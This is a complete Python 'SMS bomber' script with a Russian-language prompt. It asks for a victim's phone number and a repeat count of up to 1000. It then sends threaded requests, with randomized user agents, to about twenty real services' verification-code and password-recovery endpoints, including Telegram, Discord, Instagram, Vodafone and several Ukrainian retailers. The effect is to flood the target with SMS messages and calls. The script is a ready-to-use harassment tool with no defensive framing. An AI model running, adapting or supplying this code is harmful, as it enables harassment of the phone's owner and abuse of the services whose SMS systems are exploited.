import requests
import random
import os
from rich.console import Console
from rich.progress import track
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor

console = Console()
os.system('cls' if os.name == 'nt' else 'clear')

console.print('''[red]
    #   #  ###  ##   #  ##  # #
    ## ##  # #  # #  #  #   # #
    # # #  # #  # #  #  ##  ###
    #   #  ###  # #  #  #     #
    #   #  ###  ##   #  #   ###

    ####  ###  ###  #   #
    #     # #  # #  ## ##
    ####  ###  ###  # # #
       #  #    # #  #   #
    ####  #    # #  #   #
''')

class SMSBomber:
    def __init__(self, phone_number, repetitions):
        self.phone_number = phone_number
        self.repetitions = repetitions
        self.headers = {"User-Agent": UserAgent().random}

    def generate_info(self):
        name = ''.join(random.choices('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM', k=12))
        email = f"{name}@gmail.com"
        password = f"{name}{random.choice('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')}"
        username = f"{name}{random.choice('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')}"
        return name, email, password, username

    def send_request(self, url, method="POST", data=None, json=None, headers=None, params=None):
        try:
            if method == "POST":
                requests.post(url, data=data, json=json, headers=headers, params=params)
            elif method == "GET":
                requests.get(url, headers=headers, params=params)
            domain = url.split("//")[1].split("/")[0]
            console.log(f"[green]Запрос отправлен {domain}")
        except Exception as e:
            domain = url.split("//")[1].split("/")[0]
            console.log(f"[red]Не удалось отправить запрос {domain}")

    def run(self):
        endpoints = [
            ("https://auth.multiplex.ua/login", "POST", {"json": {"login": "+" + self.phone_number}}),
            ('https://epicentrk.ua/api/person/v1/user/recoverypassword/sendrecoverycode/', "POST", {"data": {'LANG_ID': 'ua', 'USER_LOGIN': '+' + self.phone_number}, "headers": {'X-Requested-With': 'XMLHttpRequest'}}),
            #("https://my.xtra.tv/api/signup?lang=uk", "POST", {"data": {"phone": self.phone_number}}),
            ("https://bi.ua/api/v1/accounts", "POST", {"json": {"grand_type": "sms_code", "login": "Сергей", "phone": self.phone_number, "stage": "1"}}),
            ("https://my.ctrs.com.ua/api/auth/login", "POST", {"data": {"provider": "phone", "identity": self.phone_number}}),
            ("https://my.telegram.org/auth/send_password", "POST", {"data": {"phone": "+" + self.phone_number}}),
            #("https://u.icq.net/api/v70/rapi/auth/sendCoden", "GET", {"params": {"phone": self.phone_number, "devId": "ic1rtwz1s1Hj1O0r"}}),
            ("https://discord.com/api/v9/auth/register/phone", "POST", {"json": {"phone": "+" + self.phone_number}}),
            ("https://registration.vodafone.ua/api/v1/process/smsCode", "POST", {"json": {"number": self.phone_number}}),
            ("https://megasport.ua/api/auth/phone/?language=ru", "POST", {"json": {"phone": "+" + self.phone_number}}),
            ("https://zolotakoroleva.ua/api/send-otp", "POST", {"json": {"params": {"phone": "+" + self.phone_number}}}),
            #("https://mozayka.com.ua/!processing/ajax.php", "POST", {"data": {"phone": "+" + self.phone_number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"}}),
            ("https://kazan-divan.eatery.club/site/v1/pre-login", "POST", {"json": {"phone": self.phone_number}}),
            #("https://admin1.groshivsim.com/api/sms/phone-verification/create", "POST", {"json": {"phone": self.phone_number}}),
            ("https://money4you.ua/api/clientRegistration/sendValidationSms", "POST", {"json": {"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + self.phone_number, "udriveEmployee": "false"}}),
            ('https://www.instagram.com/accounts/account_recovery_send_ajax/', "POST", {"data": {'email_or_username': self.phone_number}, "headers": {'accept-encoding': 'gzip, deflate, br'}}),
            ('https://cabinet.taximaxim.ru/Services/Public.svc/api/v2/login/code/droppedcall/send', "POST", {"json": {'locale': 'uk', 'phone': self.phone_number, 'type': 'droppedcall', 'smstoken': 'vEMdSjfFO6R'}}),
            ('https://md-fashion.com.ua/bpm/validate-contact', "POST", {"data": {'phone': '+' + self.phone_number}}),
            ('https://be.budusushi.ua/login', "POST", {"data": {'LoginForm[username]': self.phone_number}}),
            ('https://dnipro-m.ua/uk/phone-verification/', "POST", {"data": {'phone': self.phone_number}}),
            ('https://rider.uklon.com.ua/api/v1/phone/send-code', "POST", {"json": {'username': '+' + self.phone_number}})
        ]

        def send_requests_for_endpoint(endpoint):
            url, method, kwargs = endpoint
            self.send_request(url, method, **kwargs)

        for _ in track(range(self.repetitions)):
            with ThreadPoolExecutor(max_workers=10) as executor:
                executor.map(send_requests_for_endpoint, endpoints)

if __name__ == "__main__":
    phone_number = console.input('[green]Введите номер телефона (без +): ')
    repetitions = int(console.input('[green]Введите количество повторов (1-1000): '))

    sms_bomber = SMSBomber(phone_number, repetitions)
    sms_bomber.run()
